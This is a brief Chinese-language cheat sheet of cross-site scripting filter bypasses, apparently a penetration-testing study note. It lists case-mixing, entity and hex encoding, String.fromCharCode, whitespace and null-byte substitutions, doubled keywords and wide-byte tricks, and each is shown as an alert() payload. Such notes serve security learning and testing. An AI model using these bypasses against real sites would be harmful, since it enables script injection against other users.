# XSS

## 绕过检测的各种姿势

- **大小写绕过**

```html
<ScRIpT>alert('123')</sCRIpT>
```

- **编码绕过**

```html
1.十六进制编码
2.jsfuck编码
3.url编码
4.unicode编码
<0x736372697074>alert('123')</0x736372697074>
<img src="1" onerror="alert&#x28;1&#x29;">
```

- **magic_quotes_gpc**

```html
<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)</script>
```

- **符号绕过**

```
%0a         替换空格
%0d         替换空格
/**/        替换空格
%00         截断
``          替换括号
```

- **双字符绕过**

```html
<img ononerrorerror="123">
<script>alalertert(123)</script>
```

- **宽字节绕过**

```
gbxxxx系列的编码，尝试一下宽字节  %c0，%bf，%5c，%df
```

## XSS Payload

```
<script>alert(1)</script>  
```

